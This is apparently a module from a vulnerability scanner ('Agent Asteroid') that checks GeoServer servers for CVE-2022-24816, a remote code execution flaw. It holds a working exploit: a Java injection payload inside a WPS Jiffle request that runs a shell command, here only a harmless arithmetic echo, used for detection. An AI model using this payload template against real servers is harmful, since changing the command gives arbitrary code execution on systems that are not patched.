"""Agent Asteroid implementation for CVE-2022-24816."""

import platform

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "GeoServer WPS Remote Code Execution"
VULNERABILITY_REFERENCE = "CVE-2022-24816"
VULNERABILITY_DESCRIPTION = (
    "A remote code execution vulnerability in the JT-JIFFLE extension of Geoserver allows remote attackers to execute "
    "arbitrary code."
)
RECOMMENDATION = (
    "Ensure GeoServer is updated to the latest version. Disable WPS if not needed."
)
DEFAULT_TIMEOUT = 90


@exploits_registry.register
class GeoServerWPSExploit(definitions.Exploit):
    """
    CVE-2022-24816: GeoServer WPS Remote Code Execution.
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating="CRITICAL",
        recommendation=RECOMMENDATION,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Checks if the target is vulnerable to GeoServer WPS RCE.

        Args:
            target (definitions.Target): The target to check vulnerability for.

        Returns:
            bool: True if vulnerable, False otherwise.
        """
        try:
            response = self.session.get(
                f"{target.origin}/geoserver", timeout=DEFAULT_TIMEOUT
            )
            return response.status_code == 200 and "GeoServer" in response.headers.get(
                "Server", ""
            )
        except requests_exceptions.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Checks for GeoServer WPS RCE vulnerability on the target.

        Args:
            target (definitions.Target): The target to check vulnerability for.

        Returns:
            list[definitions.Vulnerability]: List of vulnerabilities found (empty if none).
        """
        if platform.system() == "Windows":
            command = 'powershell -Command "Write-Output (452345 * 32)"'
        else:  # Linux or Unix-like
            command = "echo $((452345 * 32))"

        malicious_script = f""" dest = y() - (500); // */ public class Double {{ public static double NaN = 0; static 
        {{ try {{ java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(
        java.lang.Runtime.getRuntime().exec("{command}").getInputStream())); String line = null; String allLines = " 
        - "; while ((line = reader.readLine()) != null) {{ allLines += line; }} throw new RuntimeException(allLines); 
        }} catch (java.io.IOException e) {{}} }} }} /**
        """

        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
        <wps:Execute version="1.0.0" service="WPS" 
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" 
        xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" 
        xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" 
        xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" 
        xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 
        http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd"> 
        <ows:Identifier>ras:Jiffle</ows:Identifier> 
        <wps:DataInputs> 
        <wps:Input> 
        <ows:Identifier>coverage</ows:Identifier> 
        <wps:Data> 
        <wps:ComplexData mimeType="text/plain"><![CDATA[{malicious_script}]]></wps:ComplexData> 
        </wps:Data> 
        </wps:Input> 
        </wps:DataInputs> 
        </wps:Execute>"""

        headers = {"Content-Type": "application/xml"}
        try:
            response = self.session.post(
                f"{target.origin}/geoserver/wms",
                data=payload,
                headers=headers,
                timeout=DEFAULT_TIMEOUT,
            )
            if "14475040" in response.text:  # 452345 * 32 = 14475040
                vulnerability = self._create_vulnerability(target)
                vulnerability.technical_detail = f"{target.origin}/geoserver is vulnerable to {VULNERABILITY_REFERENCE}, {VULNERABILITY_TITLE}"
                return [vulnerability]
        except requests_exceptions.RequestException:
            return []

        return []
